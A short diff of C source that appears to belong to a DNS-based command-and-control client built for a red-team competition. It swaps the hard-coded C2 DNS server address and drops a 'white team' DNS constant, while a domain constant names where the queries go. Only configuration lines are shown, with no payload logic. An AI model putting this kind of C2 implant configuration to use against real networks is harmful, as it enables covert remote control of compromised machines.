@@ -14,9 +14,7 @@
 
 // Global variables
 static const char DOMAIN[] = "doshmajhan.com";      // domain we're sending queries to
-static const char WHITE_TEAM_DNS[] = "10.22.0.0";   // White team dns, change when we find out
-//static const char C2_DNS[] = "10.22.16.16";           // my dns server
-static const char C2_DNS[] = "54.204.129.96";
+static const char C2_DNS[] = "52.70.97.43";
 
 /* Function:    createQuery
  * ------------------------
